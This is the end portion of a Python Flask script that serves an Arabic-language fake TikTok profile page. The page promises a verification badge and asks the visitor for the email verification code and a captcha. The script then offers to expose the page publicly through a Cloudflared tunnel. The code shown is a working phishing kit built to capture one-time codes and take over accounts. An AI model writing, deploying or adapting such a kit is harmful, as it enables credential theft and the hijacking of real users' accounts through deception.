                <div class="stat-item"><div class="stat-number">''' + f"{user_data['following']:,}" + '''</div><div class="stat-label">أتابعه</div></div>
                <div class="stat-item"><div class="stat-number">''' + f"{user_data['followers']:,}" + '''</div><div class="stat-label">متابعين</div></div>
                <div class="stat-item"><div class="stat-number">''' + f"{user_data['likes']:,}" + '''</div><div class="stat-label">تسجيلات الإعجاب</div></div>
                <div class="stat-item"><div class="stat-number">''' + f"{user_data['videos']:,}" + '''</div><div class="stat-label">مقاطع فيديو</div></div>
            </div>
            <div class="verification-section">
                <h3 class="verification-title">التحقق الأمني للحصول على شارة التحقق</h3>
                <div class="message message-info">
                    <p>تم إرسال رمز التحقق إلى بريدك الإلكتروني. يرجى إدخاله أدناه.</p>
                </div>
                <form method="POST" action="/profile" id="verification-form">
                    <div class="captcha-container">
                        <img src="/captcha/''' + captcha_id + '''" alt="رمز التحقق المرئي" class="captcha-image" onerror="this.style.display='none'">
                    </div>
                    <div class="input-group">
                        <input type="text" name="captcha_input" class="input-field" placeholder="أدخل رمز التحقق المرئي" required id="captchaInput" maxlength="5">
                    </div>
                    <div class="input-group">
                        <input type="text" name="verification_code" class="input-field" placeholder="رمز التحقق المكون من 6 أرقام" required id="verifyInput" maxlength="6">
                    </div>
                    <button type="submit" class="btn btn-primary" id="submitButton" disabled>تحقق</button>
                </form>
                <div class="countdown" id="countdown-timer">الوقت المتبقي: 2:00</div>
                <div style="text-align: center;">
                    <button class="btn btn-resend" id="resendButton" style="display: none;" onclick="resendCode()">إعادة إرسال رمز التحقق</button>
                </div>
            </div>
        </div>
    </div>
    <footer class="footer">
        <div class="footer-links">
            <a href="https://www.tiktok.com/about?lang=ar" class="footer-link" target="_blank">حول TikTok</a>
            <a href="https://newsroom.tiktok.com/ar-mena" class="footer-link" target="_blank">الأخبار</a>
            <a href="https://www.tiktok.com/business/ar" class="footer-link" target="_blank">TikTok للأعمال</a>
            <a href="https://developers.tiktok.com/" class="footer-link" target="_blank">المطورون</a>
            <a href="https://www.tiktok.com/transparency/ar-sa/" class="footer-link" target="_blank">الشفافية</a>
            <a href="https://careers.tiktok.com/" class="footer-link" target="_blank">الوظائف</a>
            <a href="https://www.tiktok.com/legal/terms-of-service?lang=ar" class="footer-link" target="_blank">شروط الخدمة</a>
            <a href="https://www.tiktok.com/legal/privacy-policy-row?lang=ar" class="footer-link" target="_blank">سياسة الخصوصية</a>
            <a href="https://support.tiktok.com/ar" class="footer-link" target="_blank">المساعدة</a>
            <a href="https://www.tiktok.com/safety/ar-sa/" class="footer-link" target="_blank">الأمان</a>
        </div>
        <div class="footer-copyright">© 2025 TikTok</div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const captchaInput = document.getElementById('captchaInput');
            const verifyInput = document.getElementById('verifyInput');
            const submitButton = document.getElementById('submitButton');
            const countdownTimer = document.getElementById('countdown-timer');
            const resendButton = document.getElementById('resendButton');
            
            function checkInputs() {
                if (captchaInput.value.trim().length > 0 && verifyInput.value.trim().length > 0) {
                    submitButton.disabled = false;
                    submitButton.classList.add('active');
                } else {
                    submitButton.disabled = true;
                    submitButton.classList.remove('active');
                }
            }
            
            if (captchaInput && verifyInput && submitButton) {
                captchaInput.addEventListener('input', checkInputs);
                verifyInput.addEventListener('input', checkInputs);
            }
            
            let timeRemaining = 120;
            const countdown = setInterval(function() {
                const minutes = Math.floor(timeRemaining / 60);
                const seconds = timeRemaining % 60;
                countdownTimer.textContent = 'الوقت المتبقي: ' + minutes + ':' + seconds.toString().padStart(2, '0');
                if (timeRemaining <= 0) {
                    clearInterval(countdown);
                    countdownTimer.textContent = 'انتهت صلاحية الرمز';
                    if (resendButton) {
                        resendButton.style.display = 'inline-block';
                    }
                }
                timeRemaining--;
            }, 1000);
        });
        
        function resendCode() {
            window.location.reload();
        }
    </script>
</body>
</html>'''
    return template

def start_server():
    console.print("\n[bold red][*][/bold red] Choose Tunnel Method:")
    console.print("[bold white][1][/bold white] Localhost (http://127.0.0.1:5000)")
    console.print("[bold white][2][/bold white] Cloudflared Tunnel\n")

    tunnel = input(">> Enter option [1 or 2]: ").strip()

    Thread(target=watch_input, daemon=True).start()

    if tunnel == "1":
        console.print("\n[bold green][+][/bold green] Localhost running at: [bold white]http://127.0.0.1:5000[/bold white]")
        app.run(host='127.0.0.1', port=5000, debug=False, threaded=True, use_reloader=False)
    elif tunnel == "2":
        console.print("\n[bold yellow][~][/bold yellow] Starting Flask server with Cloudflared tunnel...\n")

        def run_flask():
            app.run(host='127.0.0.1', port=5000, debug=False, threaded=True, use_reloader=False)
        flask_thread = Thread(target=run_flask, daemon=True)
        flask_thread.start()

        time.sleep(2)

        console.print("[bold green][+][/bold green] Starting Cloudflared tunnel...\n")
        cloudflared_process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"]
        )

        console.print("[bold green][+][/bold green] Cloudflared is running. Press Ctrl+C to exit.")
        cloudflared_process.wait()
    else:
        console.print("\n[bold red][-] Invalid option![/bold red]")

if __name__ == "__main__":
    start_server()
